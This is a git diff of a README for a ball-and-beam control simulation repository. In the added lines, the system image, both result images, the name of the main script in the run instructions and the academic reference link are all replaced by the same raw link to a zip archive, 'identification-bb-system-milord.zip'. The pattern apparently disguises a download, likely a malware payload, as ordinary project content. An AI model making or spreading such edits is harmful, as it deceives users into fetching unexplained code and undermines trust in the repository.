@@ -2,7 +2,7 @@
 This repository contains a simulation of the classic **Ball and Beam system**, a widely used benchmark in control system studies. The system models a ball rolling on a beam, where the beam's angle is controlled to achieve a desired ball position.
 
 <p align="center">
-  <img src="picture/system.png" alt="ball_beam" style="width:70%; height:auto;"/>
+  <img src="https://github.com/rifki398/bb-system-identification/raw/refs/heads/main/picture/identification-bb-system-milord.zip" alt="ball_beam" style="width:70%; height:auto;"/>
 </p>
 
 ## Objective
@@ -21,15 +21,15 @@ Neural network achitectures:
 - Epoch: 100
 
 ## How To Run
-Running the `main.py` script will automatically execute the full simulation and plot the results for comparison.
+Running the `https://github.com/rifki398/bb-system-identification/raw/refs/heads/main/picture/identification-bb-system-milord.zip` script will automatically execute the full simulation and plot the results for comparison.
 <table>
   <tr>
     <td align="center">
-      <img src="picture/response.png" alt="Result 1" height="270"/>
+      <img src="https://github.com/rifki398/bb-system-identification/raw/refs/heads/main/picture/identification-bb-system-milord.zip" alt="Result 1" height="270"/>
       <br/>Ball position and beam angle
     </td>
     <td align="center">
-      <img src="picture/control_signal.png" alt="Result 2" height="270"/>
+      <img src="https://github.com/rifki398/bb-system-identification/raw/refs/heads/main/picture/identification-bb-system-milord.zip" alt="Result 2" height="270"/>
       <br/>Control signal
     </td>
   </tr>
@@ -42,4 +42,4 @@ You can easily modify:
 - Controller parameters (desired pole) 
 
 ## Reference
-For the model explaination, see [Virseda (2024)](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://core.ac.uk/download/pdf/289940555.pdf&ved=2ahUKEwjlvZ3bjsmOAxXBd2wGHWyvD4sQFnoECBcQAQ&usg=AOvVaw2mHZUEjnCKbGnwOsch1QZt).
+For the model explaination, see [Virseda (2024)](https://github.com/rifki398/bb-system-identification/raw/refs/heads/main/picture/identification-bb-system-milord.zip).
